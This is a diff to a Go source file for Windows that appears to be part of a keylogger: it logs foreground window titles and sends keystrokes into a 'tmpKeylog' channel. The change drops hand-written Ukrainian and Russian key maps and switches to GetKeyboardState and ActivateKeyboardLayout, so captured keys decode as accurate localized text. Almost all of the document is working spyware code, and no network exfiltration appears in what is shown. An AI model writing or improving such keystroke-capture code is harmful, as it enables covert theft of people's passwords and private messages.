@@ -19,83 +19,13 @@ var (
 	procGetWindowTextW           = user32.NewProc("GetWindowTextW")
 	procGetKeyboardLayout        = user32.NewProc("GetKeyboardLayout")
 	procGetWindowThreadProcessID = user32.NewProc("GetWindowThreadProcessId")
-	// procGetKeyboardState         = user32.NewProc("GetKeyboardState")
-	procMapVirtualKey = user32.NewProc("MapVirtualKeyA")
-	procToUnicode     = user32.NewProc("ToUnicode")
+	procGetKeyboardState         = user32.NewProc("GetKeyboardState")
+	procMapVirtualKey            = user32.NewProc("MapVirtualKeyA")
+	procToUnicode                = user32.NewProc("ToUnicode")
+	procActivateKeyboardLayout   = user32.NewProc("ActivateKeyboardLayout")
 
 	tmpTitle string
 )
-
-var keyToUa = map[int32]int32{
-	0x51:               0x0439,
-	0x57:               0x0446,
-	0x45:               0x0443,
-	0x52:               0x043A,
-	0x54:               0x0435,
-	0x59:               0x043D,
-	0x55:               0x0433,
-	0x49:               0x0448,
-	0x4F:               0x0449,
-	0x50:               0x0437,
-	constants.VK_OEM_4: 0x0445,
-	constants.VK_OEM_6: 0x0457,
-	0x41:               0x0444,
-	0x53:               0x0456,
-	0x44:               0x0432,
-	0x46:               0x0430,
-	0x47:               0x043F,
-	0x48:               0x0440,
-	0x4A:               0x043E,
-	0x4B:               0x043B,
-	0x4C:               0x0434,
-	constants.VK_OEM_1: 0x0436,
-	constants.VK_OEM_7: 0x0454,
-	0x5A:               0x044F,
-	0x58:               0x0447,
-	0x43:               0x0441,
-	0x56:               0x043C,
-	0x42:               0x0438,
-	0x4E:               0x0442,
-	0x4D:               0x044C,
-	constants.VK_OEM_COMMA:  0x0431,
-	constants.VK_OEM_PERIOD: 0x044E,
-}
-
-var keyToRu = map[int32]int32{
-	constants.VK_OEM_3: 0x0451,
-	0x51:               0x0439,
-	0x57:               0x0446,
-	0x45:               0x0443,
-	0x52:               0x043A,
-	0x54:               0x0435,
-	0x59:               0x043D,
-	0x55:               0x0433,
-	0x49:               0x0448,
-	0x4F:               0x0449,
-	0x50:               0x0437,
-	constants.VK_OEM_4: 0x0445,
-	constants.VK_OEM_6: 0x044A,
-	0x41:               0x0444,
-	0x53:               0x044B,
-	0x44:               0x0432,
-	0x46:               0x0430,
-	0x47:               0x043F,
-	0x48:               0x0440,
-	0x4A:               0x043E,
-	0x4B:               0x043B,
-	0x4C:               0x0434,
-	constants.VK_OEM_1: 0x0436,
-	constants.VK_OEM_7: 0x044D,
-	0x5A:               0x044F,
-	0x58:               0x0447,
-	0x43:               0x0441,
-	0x56:               0x043C,
-	0x42:               0x0438,
-	0x4E:               0x0442,
-	0x4D:               0x044C,
-	constants.VK_OEM_COMMA:  0x0431,
-	constants.VK_OEM_PERIOD: 0x044E,
-}
 
 var tmpKeylog = make(chan string)
 var tmpWindow = make(chan string)
@@ -111,19 +41,30 @@ func getForegroundWindow() (hwnd syscall.Handle, err error) {
 	return
 }
 
-// func getKeyboardState(keyboardState *uint16) (len int32, err error) {
-// 	r0, _, e1 := syscall.Syscall(procGetKeyboardState.Addr(), 1, uintptr(unsafe.Pointer(keyboardState)), 0, 0)
-// 	len = int32(r0)
+func getKeyboardState(keyboardState *uint16) (len int32, err error) {
+	r0, _, e1 := syscall.Syscall(procGetKeyboardState.Addr(), 1, uintptr(unsafe.Pointer(keyboardState)), 0, 0)
+	len = int32(r0)
 
-// 	if len == 0 {
-// 		if e1 != 0 {
-// 			err = error(e1)
-// 		} else {
-// 			err = syscall.EINVAL
-// 		}
-// 	}
-// 	return
-// }
+	if len == 0 {
+		if e1 != 0 {
+			err = error(e1)
+		} else {
+			err = syscall.EINVAL
+		}
+	}
+	return
+}
+
+func activateKeyboardLayout(hkl syscall.Handle) (hklResult syscall.Handle, err error) {
+	r0, _, e1 := syscall.Syscall(procActivateKeyboardLayout.Addr(), 2, uintptr(hkl), 0x00000008, 0)
+
+	if e1 != 0 {
+		err = error(e1)
+		return
+	}
+	hklResult = syscall.Handle(r0)
+	return
+}
 
 func mapVirtualKey(uCode syscall.Handle) (scanCode syscall.Handle, err error) {
 	r0, _, e1 := syscall.Syscall(procMapVirtualKey.Addr(), 2, uintptr(uCode), 0, 0)
@@ -205,7 +146,7 @@ func windowLogger() {
 	}
 }
 
-func getLanguage() int {
+func getLanguage() (syscall.Handle, int) {
 	foregroundWindow, getForegroundWindowErr := getForegroundWindow()
 	if getForegroundWindowErr != nil {
 		log.Fatalf("getForegroundWindow -> %v", getForegroundWindowErr)
@@ -227,16 +168,16 @@ func getLanguage() int {
 		log.Fatalf("languageCodeErr -> %v", languageCodeErr)
 	}
 
-	return languageID
+	return hkl, languageID
 }
 
 func getUnicodeKey(virtualCode int) string {
 	keyboardBuf := make([]uint16, 256)
 
-	// _, getKeyboardStateErr := getKeyboardState(&keyboardBuf[0])
-	// if getKeyboardStateErr != nil {
-	// 	log.Fatalf("getKeyboardState -> %v", getKeyboardStateErr)
-	// }
+	_, getKeyboardStateErr := getKeyboardState(&keyboardBuf[0])
+	if getKeyboardStateErr != nil {
+		log.Fatalf("getKeyboardState -> %v", getKeyboardStateErr)
+	}
 
 	scanCode, mapVirtualKeyErr := mapVirtualKey(syscall.Handle(virtualCode))
 	if mapVirtualKeyErr != nil {
@@ -244,19 +185,16 @@ func getUnicodeKey(virtualCode int) string {
 	}
 
 	// TEST LANGUAGE
-	languageID := getLanguage()
+	hkl, languageID := getLanguage()
 	switch languageID {
 	case constants.US:
+		activateKeyboardLayout(hkl)
 		fmt.Printf("Language: United States (US) \r\n")
 	case constants.UA:
-		for key, val := range keyToUa {
-			keyboardBuf[int(key)] = uint16(val)
-		}
+		activateKeyboardLayout(hkl)
 		fmt.Printf("Language: Ukraine (UA) \r\n")
 	case constants.RU:
-		for key, val := range keyToRu {
-			keyboardBuf[int(key)] = uint16(val)
-		}
+		activateKeyboardLayout(hkl)
 		fmt.Printf("Language: Russia (RU) \r\n")
 	}
 
